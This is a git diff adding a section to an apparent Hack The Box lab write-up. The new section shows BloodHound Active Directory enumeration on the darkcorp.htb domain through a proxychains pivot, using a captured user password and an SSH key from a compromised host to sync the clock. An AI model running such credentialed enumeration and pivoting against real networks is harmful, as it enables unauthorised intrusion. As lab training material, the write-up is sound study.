@@ -532,3 +532,42 @@ The web app uses basic authentication, login with `victor`'s credential:
 ![](https://github.com/user-attachments/assets/4cdfdd14-9d3f-4854-a935-da3c97e40389)
 
 ![](https://github.com/user-attachments/assets/84d46744-1e51-48c9-b720-046be818b49c)
+
+### 4.3. BloodHound with `victor.r`
+
+Attempting to use `bloodhound-ce-python` encounters `KRB_AP_ERR_SKEW(Clock skew too great)` error
+
+```console
+root@kali:~# proxychains bloodhound-ce-python -d darkcorp.htb -u victor.r -p 'victor1gustavo@#' -ns 172.16.20.1 -c all --dns-tcp --zip
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+INFO: BloodHound.py for BloodHound Community Edition
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:53  ...  OK
+INFO: Found AD domain: darkcorp.htb
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:53  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:53  ...  OK
+INFO: Getting TGT for user
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc-01.darkcorp.htb:88  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc-01.darkcorp.htb:88  ...  OK
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+INFO: Connecting to LDAP server: dc-01.darkcorp.htb
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:53  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.54:389 <--socket error or timeout!
+```
+
+Since only TCP can go through proxychains, ntpdate doesn't work here
+
+Synchronize the time on kali with the target using `date` and `ssh`:
+
+```sh
+timedatectl set-ntp 0
+timedatectl set-timezone UTC
+date -s $(ssh -i id_ed25519 postgres@drip.htb 'date -u +%Y-%m-%dT%H:%M:%S')
+```
+
+Run BloodHound with `netexec`:
+
+```console
+proxychains netexec ldap dc-01.darkcorp.htb -d darkcorp.htb -u victor.r -p 'victor1gustavo@#' --dns-server 172.16.20.1 --dns-tcp --bloodhound --collection All
+```
